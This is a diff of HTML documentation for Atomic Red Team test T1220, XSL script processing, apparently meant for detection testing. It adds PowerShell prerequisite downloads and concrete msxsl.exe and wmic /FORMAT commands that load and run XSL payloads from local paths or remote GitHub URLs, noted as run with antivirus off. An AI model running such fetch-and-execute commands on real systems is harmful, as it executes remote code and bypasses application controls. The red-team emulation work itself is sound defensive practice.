@@ -914,6 +914,49 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-xml-file-must-exist-on-disk-at-specified-location-xmlfile">
+         Description: XML file must exist on disk at specified location (#{xmlfile})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-xsl-file-must-exist-on-disk-at-specified-location-xslfile">
+         Description: XSL file must exist on disk at specified location (#{xslfile})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id1">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id2">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -931,7 +974,7 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id1">
+      <a class="reference internal nav-link" href="#id3">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -948,7 +991,35 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id2">
+      <a class="reference internal nav-link" href="#id4">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-xsl-file-must-exist-on-disk-at-specified-location-local-xsl-file">
+         Description: XSL file must exist on disk at specified location (#{local_xsl_file})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id5">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id6">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id7">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -965,7 +1036,7 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
-      <a class="reference internal nav-link" href="#id3">
+      <a class="reference internal nav-link" href="#id8">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -1023,9 +1094,51 @@
 <h3>Atomic Test #1 - MSXSL Bypass using local files<a class="headerlink" href="#atomic-test-1-msxsl-bypass-using-local-files" title="Permalink to this headline">¶</a></h3>
 <p>Executes the code specified within a XSL script tag during XSL transformation using a local payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-xml-file-must-exist-on-disk-at-specified-location-xmlfile">
+<h5>Description: XML file must exist on disk at specified location (#{xmlfile})<a class="headerlink" href="#description-xml-file-must-exist-on-disk-at-specified-location-xmlfile" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1220</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">msxslxmlfile</span><span class="p">.</span><span class="n">xml</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1220</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">msxslxmlfile</span><span class="p">.</span><span class="n">xml</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1220\src\msxslxmlfile.xml&quot;</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="description-xsl-file-must-exist-on-disk-at-specified-location-xslfile">
+<h5>Description: XSL file must exist on disk at specified location (#{xslfile})<a class="headerlink" href="#description-xsl-file-must-exist-on-disk-at-specified-location-xslfile" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id1">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1220</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">msxslscript</span><span class="p">.</span><span class="n">xsl</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id2">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1220</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">msxslscript</span><span class="p">.</span><span class="n">xsl</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1220\src\msxslscript.xsl&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1220</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\Windows\Temp\msxsl.exe PathToAtomicsFolder\T1220\src\msxslxmlfile.xml PathToAtomicsFolder\T1220\src\msxslscript.xsl
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1041,9 +1154,9 @@
 <h3>Atomic Test #2 - MSXSL Bypass using remote files<a class="headerlink" href="#atomic-test-2-msxsl-bypass-using-remote-files" title="Permalink to this headline">¶</a></h3>
 <p>Executes the code specified within a XSL script tag during XSL transformation using a remote payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
-<div class="section" id="id1">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
+<div class="section" id="id3">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\Windows\Temp\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1059,9 +1172,35 @@
 <h3>Atomic Test #3 - WMIC bypass using local XSL file<a class="headerlink" href="#atomic-test-3-wmic-bypass-using-local-xsl-file" title="Permalink to this headline">¶</a></h3>
 <p>Executes the code specified within a XSL script using a local payload.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
-<div class="section" id="id2">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic #{wmic_command} /FORMAT:&quot;#{local_xsl_file}&quot;
+<div class="section" id="id4">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-xsl-file-must-exist-on-disk-at-specified-location-local-xsl-file">
+<h5>Description: XSL file must exist on disk at specified location (#{local_xsl_file})<a class="headerlink" href="#description-xsl-file-must-exist-on-disk-at-specified-location-local-xsl-file" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id5">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1220</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">wmicscript</span><span class="p">.</span><span class="n">xsl</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id6">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1220</span><span class="p">\</span><span class="n">src</span><span class="p">\</span><span class="n">wmicscript</span><span class="p">.</span><span class="n">xsl</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1220\src\wmicscript.xsl&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1220</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id7">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic process list /FORMAT:&quot;PathToAtomicsFolder\T1220\src\wmicscript.xsl&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -1077,9 +1216,9 @@
 <h3>Atomic Test #4 - WMIC bypass using remote XSL file<a class="headerlink" href="#atomic-test-4-wmic-bypass-using-remote-xsl-file" title="Permalink to this headline">¶</a></h3>
 <p>Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test sucessfully executed, while AV turned off.</p>
 <p><strong>Supported Platforms:</strong> windows</p>
-<div class="section" id="id3">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic #{wmic_command} /FORMAT:&quot;#{remote_xsl_file}&quot;
+<div class="section" id="id8">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic process list /FORMAT:&quot;https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
